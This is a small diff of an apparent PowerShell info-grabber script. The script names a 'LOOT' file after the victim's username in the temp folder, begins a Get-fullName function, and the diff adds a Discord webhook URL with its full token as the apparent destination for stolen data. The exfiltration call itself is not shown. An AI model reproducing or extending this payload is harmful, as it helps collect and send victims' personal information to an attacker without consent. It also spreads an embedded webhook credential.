@@ -1,4 +1,6 @@
 $FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"
+$dc = 'https://discordapp.com/api/webhooks/1329568581511282718/95MsmT8cXkoGQDeQKzZUGXd-AgIVU6kThu2qi81x3TTZ_oaZBdWuQUpSMHQ7WSItAKBB'
+
 #------------------------------------------------------------------------------------------------------------------------------------
 
 function Get-fullName {
